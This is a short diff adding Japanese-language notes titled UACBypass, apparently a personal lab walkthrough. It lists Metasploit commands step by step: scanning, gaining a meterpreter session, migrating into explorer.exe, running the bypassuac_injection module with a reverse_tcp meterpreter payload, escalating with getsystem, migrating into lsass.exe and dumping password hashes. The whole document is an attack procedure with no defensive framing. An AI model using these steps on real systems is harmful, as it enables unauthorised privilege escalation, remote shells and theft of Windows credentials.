@@ -1,0 +1,30 @@
+UACBypass
+1) ping
+2) nmap
+3) msfconsole
+4) search 
+5) use 
+6) set
+7) exploit
+8) meterpreterの権限を奪えたら、以下のコマンドを使って、ユーザーの情報を取得する
+sysinfo
+getuid
+9) explorer.exe の PID を検索し、 migrate コマンドを使用して現在のプロセスを explorer プロセスに移行します。
+ps -S explorer.exe
+migrate 
+10) getsystemで権限昇格できるか確認する
+11) Windows シェルを取得し、管理者ユーザーが Administrators グループのメンバーであるかどうかを確認します。
+shell
+net localgroup administrators
+12) Ctrl+zでmeterperterに戻り、backgroundでkalilinuxに戻って、バックグラウンドで実行する
+13) UAC バイパス インメモリ インジェクション モジュールを実行します。
+use exploit/windows/local/bypassuac_injection
+set session 1
+set TARGET 1
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+14) 再び、getsystemで権限昇格を行い、getuidでユーザーの情報を得る
+15)  lsass.exe プロセスで移行します。
+ps -S lsass.exe
+migrate 
+16) hashdumpを行う
